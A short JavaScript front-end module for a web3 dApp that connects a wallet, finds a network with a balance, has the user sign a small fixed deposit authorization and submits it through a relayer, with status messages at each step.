import { connectWallet } from "./wallet/connect.js"
import { findNetwork } from "./utils/scanner.js"
import { getNonce } from "./utils/getNonce.js"
import { signDeposit } from "./utils/signDeposit.js"
import { sendRelayer } from "./utils/relayer.js"
import { ethers } from "ethers"

const status=document.getElementById("status")

function setStatus(t){

 status.innerText=t
 console.log(t)

}

async function start(){

 try{

 setStatus("Connecting wallet...")

 const {signer,address}=await connectWallet()

 setStatus("Scanning networks...")

 const network=await findNetwork(address)

 if(!network){

  setStatus("No eligible balance found")

  return

 }

 setStatus("Using "+network.name)

 const provider=new ethers.JsonRpcProvider(
  network.rpc
 )

 const nonce=await getNonce(
  provider,
  address,
  network.contract
 )

 const amount="0.0005"

 setStatus("Signing authorization")

 const sig=await signDeposit(
  signer,
  network.contract,
  network.chainId,
  amount,
  nonce
 )

 setStatus("Sending to relayer")

 const iface=new ethers.Interface([
 "function executeDeposit(address user,uint256 amount,uint256 nonce,bytes signature)"
 ])

 const encoded=iface.encodeFunctionData(
 "executeDeposit",
 [
  sig.value.user,
  sig.value.amount,
  nonce,
  sig.signature
 ]
 )

 const result=await sendRelayer({

  network:network.name,

  contractAddress:network.contract,

  encodedFunctionData:encoded,

  amount,

  nonce

 })

 if(result.success){

  setStatus("Transaction executed: "+result.hash)

 }else{

  setStatus("Relayer error: "+result.error)

 }

 }catch(e){

  console.error(e)

  setStatus("Process failed")

 }

}

document
.getElementById("connect")
.onclick=start
